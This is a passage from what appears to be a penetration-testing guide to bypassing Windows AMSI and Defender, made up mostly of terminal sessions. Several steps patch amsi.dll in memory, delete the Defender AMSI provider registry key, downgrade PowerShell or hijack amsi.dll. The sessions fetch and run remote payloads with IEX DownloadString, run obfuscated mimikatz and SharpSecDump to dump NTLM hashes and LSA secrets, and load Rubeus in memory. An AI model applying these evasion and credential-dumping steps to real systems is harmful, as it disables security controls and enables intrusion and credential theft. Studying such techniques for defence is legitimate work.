        [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256] 
        [/principaltype:principal|enterprise|x500|srv_xhost|srv_host|srv_inst]

<SNIP>


***************************************************************************************************************************************************
➤ AMSI bypass technique 3 - Patching the "Amsi.dll" in memory (AmsiOpenSession)
***************************************************************************************************************************************************

AmsiOpenSession is a lesser-known function within AMSI that plays a crucial role in scanning scripts and executables. 
By modifying it dynamically at runtime, we can disable AMSI’s scanning capabilities before the payload even reaches AmsiScanBuffer or AmsiScanString. 
This makes our evasion technique more stealthy and efficient. However, this AMSI bypass technique is effective only works for PowerShell scripts. 
It won't work to load C# assemblies like Rubeus and Certify. 
Though, you can still run offensive tools developed with unmanaged code (e.g., C/C++) embeded in PowerShell scripts via reflected code loading in-memory.

There are multiple blogs and GitHub projects that share example of code to patch the AMSI.dll in memory (AmsiOpenSession).
=> https://github.com/raskolnikov90/LainAmsiOpenSession
=> https://www.blazeinfosec.com/post/tearing-amsi-with-3-bytes/
=> https://github.com/anonymous300502/Nuke-AMSI
=> https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell


--------------------------------------------------------------------------------------------------------------------------------
PoC n°1 - Patching the "Amsi.dll" in memory (AmsiOpenSession) on a Windows Server 2022 protected by the MS Defender antivirus
          => Test with an obfuscated version of the script "Nuke-AMSI"
--------------------------------------------------------------------------------------------------------------------------------

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\temp> Get-ComputerInfo | Select WindowsProductName

WindowsProductName
------------------
Windows Server 2022 Standard Evaluation


PS C:\temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,AntispywareEnabled, AntivirusSIgnatureLastUpdated|FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
BehaviorMonitorEnabled        : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSIgnatureLastUpdated : 8/16/2025 4:35:15 AM


PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.23:8080/Part1.txt');
PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.23:8080/Part2.txt');
PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.23:8080/Part3.txt');
Starting AMSI modification script...
Modifying all PowerShell processes...
Modifying process with ID System.Diagnostics.Process (powershell).Id
Modifying AMSI for process ID: 4348
Loading amsi.dll...
Getting address of AmsiOpenSession function...
Changing memory protection at address 140708326458275 to PAGE_EXECUTE_READWRITE...                                           
Patching memory at address 140708326458275 with byte 0xEB...                                                                 
Memory patched successfully at address 140708326458275.                                                                      
Restoring original memory protection...                                                                                      
Closing handle to process with ID 4348.
0
AMSI modification script completed.

PS C:\temp> invoke-mimikatz

invoke-mimikatz : The term 'invoke-mimikatz' is not recognized as the name of a cmdlet, function, script file, or operable
program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ invoke-mimikatz
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (invoke-mimikatz:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

PS C:\temp> PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.23:8080/invoke-mimi-custom.ps1');

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 226789 (00000000:000375e5)
Session           : Interactive from 1
User Name         : Administrator
Domain            : SERVER-WIN2022
Logon Server      : SERVER-WIN2022
Logon Time        : 8/16/2025 6:30:35 PM
SID               : S-1-5-21-3336774573-1234467604-3718094125-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : SERVER-WIN2022
         * NTLM     : 6699270562fdbd1e74c7d3<SNIP>
<SNIP>


-------------------------------------------------------------------------------------------------------------------------------
PoC n°2 - Patching the "Amsi.dll" in memory (AmsiOpenSession) on a Windows 10 Laptop protected by the MS Defender antivirus 
          => Test with an obfuscated version of the script "LainAmsiOpenSession"
-------------------------------------------------------------------------------------------------------------------------------

C:\Temp>powershell -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,AntispywareEnabled, 
            AntivirusSIgnatureLastUpdated|FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
BehaviorMonitorEnabled        : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSIgnatureLastUpdated : 8/17/2025 3:41:41 AM


PS C:\Temp> $var1 = (New-Object Net.WebClient).DownloadString('http://192.168.1.23:8080/lainamsiopensession-part1.txt');
PS C:\Temp> $var2 = (New-Object Net.WebClient).DownloadString('http://192.168.1.23:8080/lainamsiopensession-part2.txt');
PS C:\Temp> iex($var1)
PS C:\Temp> iex($var2)
True

PS C:\Temp> 
PS C:\Temp> invoke-mimikatz
invoke-mimikatz : The term 'invoke-mimikatz' is not recognized as the name of a cmdlet, function, script file, or operable program. 
Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ invoke-mimikatz
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (invoke-mimikatz:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

=> No more AMSI  :)


***************************************************************************************************************************************************
➤ AMSI bypass technique 4 - Using hardware breakpoint on "AmsiScanBuffer"
***************************************************************************************************************************************************

Using hardware breakpoints has the great advantage that userland hooks don't need to be bypassed, the integrity of the targeted DLLs remains valid, 
and memory scanners can't detect manipulations. 
Many AV/EDR products don't detect this technique yet.

Multiple PoCs and tools are available:
--------------------------------------
=> https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Using-Hardware-Breakpoints
=> https://gist.github.com/susMdT/360c64c842583f8732cc1c98a60bfd9e
=> https://github.com/rad9800/misc/blob/main/hooks/etw-amsi-llex-patch.c
=> https://gist.github.com/CCob/fe3b63d80890fafeca982f76c8a3efdf
=> https://github.com/racoten/BetterNetLoader
=> https://github.com/icyguider/LightsOut


----------------------------------------------------------------------------------------------------------------------------------
PoC - AMSI bypass using hardware breakpoint on "AmsiScanBuffer" on a Windows 2022 server protected by the MS Defender antivirus 
      => Test with an obfuscated version of the tool "BetterNetLoader"
----------------------------------------------------------------------------------------------------------------------------------

=> https://github.com/racoten/BetterNetLoader

This tool is a version of "NetLoader" that execute .Net assemblies and bypass ETW and AMSI using hardware breakpoints.


C:\temp> Packed_tool.exe
Usage:
  Packed_tool.exe -path <location> -a <cleartext arguments>
  Packed_tool.exe -path <location> -b64 <base64 encoded arguments>

Options:
  -path    Specify the location of the assembly. If the path begins with "http",
           an HTTP request is made; otherwise, it is treated as a local file.
  -a       Provide cleartext arguments for DotnetExecute.
  -b64     Provide base64 encoded arguments for DotnetExecute.

C:\Users\Administrator> powershell -c "Get-ComputerInfo | Select WindowsProductName"

WindowsProductName
------------------
Windows Server 2022 Standard Evaluation


C:\Users\Administrator> powershell -c "Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled, 
                                       AntivirusSIgnatureLastUpdated|FL"

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSIgnatureLastUpdated : 8/18/2025 5:19:10 AM


C:\Users\Administrator> powershell -c "wget -uri http://192.168.1.144:8080/Packed_tool.exe -OutFile C:\Users\Administrator\Packed_tool.exe"
C:\Users\Administrator> powershell -c "wget -uri http://192.168.1.144:8080/msvcp140.dll -OutFile C:\Users\Administrator\msvcp140.dll"


C:\Users\Administrator> Packed_tool.exe -path http://192.168.1.144:8080/RuB-3us.exe -a triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3


Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x83d32

 ---------------------------------------
 | LUID | UserName | Service | EndTime |
 ---------------------------------------
 ---------------------------------------


C:\Users\Administrator> Packed_tool.exe -path http://192.168.1.144:8080/SeaTbE1t.exe -a AMSIProviders


                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v1.2.2         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,


====== AMSIProviders ======

  GUID                           : {2781761E-28E0-4109-99FE-B9D127C57AFE}
  ProviderPath                   : "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0\MpOav.dll"

[*] Completed collection in 0.067 seconds



***************************************************************************************************************************************************
➤ AMSI bypass technique 5 - Modify a Windows registry key to disable the AMSI (admin priv required)
***************************************************************************************************************************************************

AMSI Providers are responsible for the scanning process by the antivirus product and are registered in a location in the registry. 
The GUID for Microsoft Defender is: HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
We can remove the registry key to bypass/disable the AMSI if we have local administrator privileges but it is not stealth.

PS C:\> reg query HKLM\SOFTWARE\Microsoft\AMSI\Providers\

    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}

PS C:\> Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse


***************************************************************************************************************************************************
➤ AMSI bypass technique 6 - PowerShell downgrade attack (use PowerShell version 2 which doesn't support AMSI)
***************************************************************************************************************************************************

Even though that Windows PowerShell 2.0 has been deprecated by Microsoft, in many companies it hasn’t been removed from all the Windows systems
due to "technical debt" issues and for compatibilty reason with old applications.
Older versions of PowerShell (v1 and v2) don't contain newer security features that Microsoft has implemented such as AMSI protection and PowerShell script-block logging. 

Note: With PowerShell version 2 we can used the "old" offensive framework such as PowerSploit, Nishang, etc.                    
(https://github.com/PowerShellMafia/PowerSploit/CodeExecution/)

--------------------------------------------------------------------------------------------------
PoC - PowerShell downgrade test on a Windows 2019 server protected by the MS Defender antivirus 
--------------------------------------------------------------------------------------------------

PS C:\Temp> systeminfo

Host Name:                 WEB-SERVER-2K19
OS Name:                   Microsoft Windows Server 2019 Datacenter
<SNIP>

C:\Temp> powershell -version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Temp> $PSversiontable

Name                           Value
----                           -----
CLRVersion                     2.0.50727.9179
BuildVersion                   6.1.7600.16385
PSVersion                      2.0
WSManStackVersion              2.0
PSCompatibleVersions           {1.0, 2.0}
SerializationVersion           1.1.0.1
PSRemotingProtocolVersion      2.1


PS C:\Users\pentester> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True


PS C:\Temp> $a = get-content .\obfuscated-mimi.txt
PS C:\Temp> $b = [System.Convert]::FromBase64String($a)
PS C:\Temp> $c = [System.Text.Encoding]::UTF8.GetString($b)
PS C:\Temp> iex ($c)

PS C:\Temp> invoke-mimi

  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # coffee

    ( (
     ) )
  .______.
  |      |]
  \      /
   `----'

mimikatz(powershell) # exit
Bye!


***************************************************************************************************************************************************
➤ AMSI bypass technique 7 - AMSI dll hijacking
***************************************************************************************************************************************************

DLL Hijacking can be used to evade AMSI by creating a non-legitimate amsi.dll file and plant it on the same folder as PowerShell.
This only works if an old version of PowerShell/.Net framework is installed on the target Windows machine. 
By default, it won't work on a fresh install of a modern Windows OS such as Windows 11 or Windows server 2022.

=> https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/
      
------------------------------------------------------------------------------------------------
PoC n°1 - AMSI dll hijacking test on a Windows 10 laptop (protected by Microsoft Defender)
------------------------------------------------------------------------------------------------

Step 1 - Copy all the PowerShell files (x64) in the folder "C:\temp\PowerShell-v1.0-win-x64\"
         Rename "Powershell.exe" as "SuperPowerSHELL.exe"
Step 2 - Create and plant a fake "amsi.dll" file in the "C:\temp" folder
Step 3 - Execute PowerShell from the "C:\temp" => it will load the fake "amsi.dll" file preventing the real AMSI to be initiated.
Step 4 - Download and execute straight into memory the hacking tool "mimikatz" as a PoC.


Microsoft Windows [Version 10.0.19045.5737]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> systeminfo

Host Name:                 POXXXXXXX
OS Name:                   Microsoft Windows 10 Professionnel
OS Version:                10.0.19045 N/A Build 19045
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
<SNIP>

PS C:\temp> $PSVersionTable

Name                           Value
----                           -----
PSVersion                      5.1.19041.6216
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.19041.6216
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1

C:\Windows\system32> cd C:\Temp\PowerShell-v1.0-win-x64

C:\Temp\PowerShell-v1.0-win-x64>dir
 Volume in drive C is Windows
 Volume Serial Number is F06E-DC58

 Directory of C:\Temp\PowerShell-v1.0-win-x64

05/03/2025  02:39 AM    <DIR>          .
05/03/2025  02:39 AM    <DIR>          ..
03/26/2025  06:10 PM             7,680 Amsi.dll
05/03/2025  02:39 AM    <DIR>          en
05/03/2025  02:39 AM    <DIR>          en-US
03/26/2025  06:17 PM    <DIR>          Examples
05/03/2025  02:39 AM    <DIR>          fr
05/03/2025  02:39 AM    <DIR>          fr-FR
05/03/2025  02:39 AM    <DIR>          Modules
12/07/2019  11:10 AM               395 powershell.exe.config
12/06/2019  07:05 PM           212,992 powershell_ise.exe
10/15/2019  03:50 PM               465 powershell_ise.exe.config
09/03/2024  07:09 PM            56,320 PSEvents.dll
12/07/2019  11:09 AM           174,592 pspluginwkr.dll
12/07/2019  11:10 AM             2,560 pwrshmsg.dll
11/18/2023  11:35 PM            30,720 pwrshsip.dll
03/26/2025  06:17 PM    <DIR>          Schemas
12/07/2019  11:14 AM    <DIR>          SessionConfig
02/18/2024  04:43 PM           455,680 SuperPowerSHELL.exe
03/26/2025  06:13 PM         2,187,193 Test.txt
12/07/2019  11:10 AM            16,598 WSMan.Format.ps1xml
              11 File(s)      3,145,195 bytes
              10 Dir(s)  125,671,903,232 bytes free

C:\Temp\PowerShell-v1.0-win-x64>SuperPowerSHELL.exe
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Temp\PowerShell-v1.0-win-x64> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/SuperMimiCustom.csv');
PS C:\Temp\PowerShell-v1.0-win-x64> invoke-mimi-custom


  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 1049710 (00000000:0010046e)
Session           : Interactive from 1
User Name         : auditor
Domain            : LAB
Logon Server      : DC3
Logon Time        : 4/29/2025 5:05:09 PM
SID               : S-1-5-21-666114207-261065646-224150901-1121
        msv :
         [00000003] Primary
         * Username : auditor
         * Domain   : LAB
         * NTLM     : 01c3e95ac8caca39656219<SNIP>
         * SHA1     : 34bdcf396abb37a4ad181a<SNIP>
         * DPAPI    : ed5d6484fd4e412f2a9659<SNIP>


--------------------------------------------------------------------------------------------------------------------------------------
PoC n°2 - AMSI dll hijacking test on a Windows 10 laptop (protected by MS Defender) using an obfuscated version of the tool 'PowerOPS'
--------------------------------------------------------------------------------------------------------------------------------------

PS C:\temp> $PSVersionTable

Name                           Value
----                           -----
PSVersion                      5.1.19041.6216
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.19041.6216
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1

PS C:\temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,
 	        AntispywareEnabled, AntivirusSIgnatureLastUpdated|FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
BehaviorMonitorEnabled        : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSIgnatureLastUpdated : 8/17/2025 3:41:41 AM


C:\temp> Power.exe

Power Console
--------- Welcome ---------

PS:\> invoke-mimi-custom

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 1122623 (00000000:0011213f)
Session           : Interactive from 1
User Name         : auditor
Domain            : LAB
Logon Server      : DC2
Logon Time        : 8/17/2025 9:19:38 PM
SID               : S-1-5-21-666114207-261065646-224150901-1121
        msv :
         [00000003] Primary
         * Username : auditor
         * Domain   : LAB
         * NTLM     : 01c3e95ac8caca3965621906<SNIP>
<SNIP>




***************************************************************************************************************************************************
➤ AMSI bypass technique 8 - Lifetime AMSI bypass by @ZeroMemoryEx 
***************************************************************************************************************************************************

Lifetime AMSI bypass by @ZeroMemoryEx 
=> https://github.com/ZeroMemoryEx/Amsi-Killer

Lifetime AMSI bypass by @ZeroMemoryEx ported to .NET Framework 4.8.
=> https://github.com/S1lkys/SharpKiller

Note: These 2 tools (Amsi-Killer & SharpKiller) scan for new PowerShell processes every 0.5 seconds and automatically patch new PowerShell instances.

---------------------------------------------------------------------------------------------------------------------------------
PoC - AMSI bypass using an obfuscated version of the tool "SharpKiller" on a Windows 2022 server (protected by MS Defender)
---------------------------------------------------------------------------------------------------------------------------------

PS C:\Users\auditor> wget -uri http://192.168.1.144:8080/Super-Sharp-K1ll3r.exe -OutFile C:\Users\auditor\Super-Sharp-K1ll3r.exe

PS C:\Users\auditor> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled, AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 5/8/2025 4:35:53 PM


PS C:\Users\auditor> Super-Sharp-K1ll3r.exe

	Monitoring for Powershell.exe
	[+] AMSI Patched: 10488
	exit


PS C:\Users\auditor> invoke-mimikatz
invoke-mimikatz : The term 'invoke-mimikatz' is not recognized as the name of a cmdlet, function, script file, or
operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try
again.
At line:1 char:1
+ invoke-mimikatz
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (invoke-mimikatz:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException


PS C:\Users\Administrator> IEX (New-Object Net.WebClient).DownloadString('https://192.168.1.144/Invoke-Rubeus.ps1');

PS C:\Users\Administrator> invoke-rubeus

cmdlet Invoke-Rubeus at command pipeline position 1
Supply values for the following parameters:
Command: help

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3


 Ticket requests and renewals:

    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] 
		[/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256] 
		[/principaltype:principal|enterprise|x500|srv_xhost|srv_host|srv_inst]

    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe 
		[/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256] 
		[/principaltype:principal|enterprise|x500|srv_xhost|srv_host|srv_inst]

<SNIP>

=> No more AMSI  :)


===================================================================================================================================================
VI.   Tools that bypass AV products (AMSI+ETW patching) and allow to load and execute straight in-memory offensive C# .Net assemblies
===================================================================================================================================================

There are many open-source tools on GitHub that allow to patch the AMSI (+ the event tracing i.e. ETW) and to load .Net assemblies (C#) from a remote web 
server URL or from a local directory.

Examples of tools
------------------
➤ NetLoader 		    	 - https://github.com/Flangvik/NetLoader
➤ BetterNetLoader	    	 - https://github.com/racoten/BetterNetLoader
➤ EAPrimer 		     	 	 - https://github.com/m8sec/EAPrimer
➤ PowerSharpPack 	     	 - https://github.com/S3cur3Th1sSh1t/PowerSharpPack
➤ Invoke-SharpLoader	     - https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader
➤ Invoke-PoSH-CsharpPacker   - https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-SharpPacker
➤ ...


***************************************************************************************************************************************************
➤ Test 1 - PoC with 'EAPrimer' on a Windows server 2022 (protected by MS Defender AV) 
            -> Download and execute in-memory C# hacking tools without being detected by AV products
***************************************************************************************************************************************************

The tool "EAPrimer" can be used to load .Net assemblies (C#) from a filepath (local directory) or a URL. 
On startup, it will attempt to perform in-memory patching of AMSI to bypass detection. 
By default, the output is written to the console, however, this can be directed to a file or even sent via HTTP POST request to a remote server.

=> https://github.com/m8sec/EAPrimer

Reminder: 
- An assembly is a collection of types and resources that are built to work together and form a logical unit of functionality. 
- Assemblies take the form of executable (.exe) or dynamic link library (.dll) files, and are the building blocks of .NET applications.

Important note
---------------
=> I obfuscated and recompiled the source code of the tool to avoid its detection by the MS Defender antivirus.


┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 192.168.1.11 -u administrator -p <SNIP>

Evil-WinRM shell v3.5

*Evil-WinRM* PS C:\Users\Administrator\Documents> dir

    Directory: C:\Users\Administrator\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/10/2023   4:41 PM          20480 Obfuscated-EA-Primer.exe
-a----          5/2/2025   5:51 PM           5988 test.txt


*Evil-WinRM* PS C:\Users\Administrator\Documents> systeminfo

Host Name:                 SERVER-WIN2022
OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00454-40000-00001-AA898
Original Install Date:     5/2/2025, 10:44:40 AM
<SNIP>


*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled,
						  						  AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 5/2/2025 7:55:30 AM


*Evil-WinRM* PS C:\Users\Administrator\Documents> ./Obfuscated-EA-Primer.exe -path=http://192.168.1.144:8080/SharpSecDump.exe -args='-target=localhost'

[*] EAPrimer v0.1.2
[*] Applying In-Memory Patch
[*] Assembly Args: "-target=localhost"
[*] Loading Asembly: http://192.168.1.144:8080/SharpSecDump.exe
[*] RemoteRegistry service started on localhost
[*] Parsing SAM hive on localhost
[*] Parsing SECURITY hive on localhost
[*] Sucessfully cleaned up on localhost
---------------Results from localhost---------------
[*] SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6699270562fdbd1e74c7<snip>
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0<snip>
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73<snip>
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5970404680bafc1<snip>
[*] Cached domain logon information(domain/username:hash)
[*] LSA Secrets
[*] DPAPI_SYSTEM
dpapi_machinekey:d3188b46fabab60b285682fd45ede236<snip>
dpapi_userkey:3204da5913299b84721884babfe89089582<snip>
[*] NL$KM
NL$KM:eaf6c281bf8b382293e87ad476a3dc27ee89f36779851e5a6f642d8621184a10762ffa62f182990621b4febb48923d11<snip>
---------------Script execution completed---------------


*Evil-WinRM* PS C:\Users\Administrator\Documents> ./Obfuscated-EA-Primer.exe -path=http://192.168.1.144:8080/Rubeus-v2.2.2.exe -args=triage
[*] EAPrimer v0.1.2
[*] Applying In-Memory Patch
[*] Assembly Args: "triage"
[*] Loading Asembly: http://192.168.1.144:8080/Rubeus-v2.2.2.exe

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0xe8e890

 ---------------------------------------
 | LUID | UserName | Service | EndTime |
 ---------------------------------------
 ---------------------------------------


***************************************************************************************************************************************************
➤ Test 2 - PoC with an improved version of the tool 'InMemoryNET' on a Windows server 2022 (protected by MS Defender AV) 
            -> Download and execute in-memory C# hacking tools without being detected by AV products
***************************************************************************************************************************************************

Improved version of the tool "https://github.com/mez-0/InMemoryNET"

This tool allows to download and execute directly into memory a remote .Net assembly with:
> AMSI patching
> ETW patching
> arguments passing

----------------------------------------------------------------------------------------------------------------------------------------
PoC - Download & execute straight in-memory the tools Rubeus.exe & Seatbelt.exe on a Windows server 2022 (protected by MS Defender AV)
----------------------------------------------------------------------------------------------------------------------------------------

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Documents\InMemoryNetv2> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled,
						   						   AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 5/26/2025 6:31:01 AM


PS C:\Users\Administrator\Documents\InMemoryNetv2> ls

    Directory: C:\Users\Administrator\Documents\InMemoryNetv2

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/2/2025   7:37 PM         288768 InMemoryNetv2.exe
